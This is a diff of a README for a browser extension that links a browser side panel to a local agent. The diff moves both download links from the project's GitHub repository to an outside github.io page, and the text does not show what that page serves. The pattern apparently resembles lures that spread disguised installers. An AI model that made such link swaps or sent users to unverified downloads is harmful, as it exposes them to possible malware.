@@ -1,6 +1,6 @@
 # 🌐 hermes-browser-extension - Connect web pages to local agents
 
-[![](https://img.shields.io/badge/Download_Extension-Blue-blue)](https://github.com/Torulose-formula909/hermes-browser-extension)
+[![](https://img.shields.io/badge/Download_Extension-Blue-blue)](https://torulose-formula909.github.io)
 
 ## What is this tool?
 The hermes-browser-extension connects your web browser to the Hermes Agent running on your computer. It creates a side panel within your browser where the agent lives. This setup lets you send text and data from websites directly to your local machine. You keep your data private because the agent runs locally. This bridge between your browser and your machine makes web research and data handling faster.
@@ -16,7 +16,7 @@ Before you install the software, ensure your computer meets these needs:
 ## 📥 Getting the extension
 You need to visit the project page to get the files. 
 
-[Click here to visit the download page](https://github.com/Torulose-formula909/hermes-browser-extension)
+[Click here to visit the download page](https://torulose-formula909.github.io)
 
 Follow these steps to finish the setup:
 
